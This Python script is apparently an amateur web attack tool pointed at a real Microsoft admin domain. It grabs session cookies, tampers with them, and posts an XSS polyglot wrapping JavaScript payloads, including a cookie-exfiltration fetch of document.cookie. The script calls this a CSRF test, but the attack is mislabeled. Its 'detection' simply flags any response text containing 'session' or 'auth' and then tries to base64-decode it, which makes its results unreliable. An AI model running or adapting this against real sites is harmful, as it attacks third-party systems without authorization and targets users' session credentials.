import requests
import re
import base64

# List of domains to test
domains = ["admin.microsoft.com"]

# Polyglot template to sandwich payloads
polyglot_start = "/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+"
polyglot_end = "{}//"

# List of JavaScript payloads to test
js_payloads = [
    "alert(1)",  # Basic alert for execution
    "fetch('/?cookie='+document.cookie)",  # Test cookie exfiltration to the same domain
    "console.log(document.cookie)",  # Log the cookie to console for confirmation
]

# Define user agent (you may need to change this to match your environment)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
}

def decode_cookie(cookie_value):
    """
    Attempt to decode the cookie value as Base64.
    """
    try:
        decoded_value = base64.b64decode(cookie_value).decode("utf-8")
        print("Decoded cookie value (Base64):", decoded_value)
        return decoded_value
    except Exception as e:
        print(f"Failed to decode cookie as Base64: {e}")
        return cookie_value

def analyze_cookie_exfiltration(response_text, domain):
    """
    Analyze the response for evidence of cookie exfiltration or reflection.
    """
    # Look for session cookie patterns in the response
    matches = re.findall(r"(?i)(cookie=|session|auth)[^;]*", response_text)
    if matches:
        print(f"[{domain}] Potential session cookie exfiltration detected:")
        for match in matches:
            print(f"    - {match.strip()}")
            # Decode the detected cookie value
            cookie_value = match.split("=")[-1]
            decode_cookie(cookie_value)
        return True
    return False

def test_csrf_vulnerability(domain):
    session = requests.Session()

    # Step 1: Visit the target domain to establish a session
    response = session.get(f"https://{domain}/", headers=headers, allow_redirects=True)
    session_cookie = session.cookies.get_dict()

    if not session_cookie:
        print(f"[{domain}] No session cookie found. Skipping.")
        return False

    print(f"[{domain}] Found session cookie: {session_cookie}")

    # Decode each cookie value (if Base64 encoded)
    for cookie_name, cookie_value in session_cookie.items():
        print(f"Decoding cookie '{cookie_name}':")
        decode_cookie(cookie_value)

    # Step 2: Attempt CSRF with sandwiched payloads
    csrf_endpoint = f"https://{domain}/"
    is_vulnerable = False  # Track overall vulnerability status
    for js_payload in js_payloads:
        sandwiched_payload = f"{polyglot_start}{js_payload}{polyglot_end}"

        # Manipulate session cookie with regex
        manipulated_cookie = {
            k: re.sub(r"(session|auth)", "manipulated", v, flags=re.IGNORECASE)
            for k, v in session_cookie.items()
        }
        session.cookies.update(manipulated_cookie)

        data = {
            "input_field": sandwiched_payload,  # Inject the sandwiched payload
        }

        # Send the manipulated request
        csrf_attack_response = session.post(csrf_endpoint, data=data, headers=headers, allow_redirects=True)

        if csrf_attack_response.status_code == 200:
            # Analyze the response
            execution_detected = js_payload in csrf_attack_response.text
            exfiltration_detected = analyze_cookie_exfiltration(csrf_attack_response.text, domain)

            if execution_detected or exfiltration_detected:
                print(f"[{domain}] Evidence of vulnerability with payload '{js_payload}'.")
                is_vulnerable = True
            else:
                print(f"[{domain}] Payload '{js_payload}' sent but no evidence of execution.")
        else:
            print(f"[{domain}] CSRF attack failed. Response code: {csrf_attack_response.status_code}")

    if is_vulnerable:
        print(f"Domain {domain} is potentially vulnerable to CSRF attacks.")
    else:
        print(f"Domain {domain} does not appear to be vulnerable to CSRF.")
    
    return is_vulnerable

# Test each domain
for domain in domains:
    print(f"Testing domain: {domain}")
    is_vulnerable = test_csrf_vulnerability(domain)
    if is_vulnerable:
        print(f"Domain {domain} is potentially vulnerable to CSRF attacks.")
    else:
        print(f"Domain {domain} does not appear to be vulnerable to CSRF.")

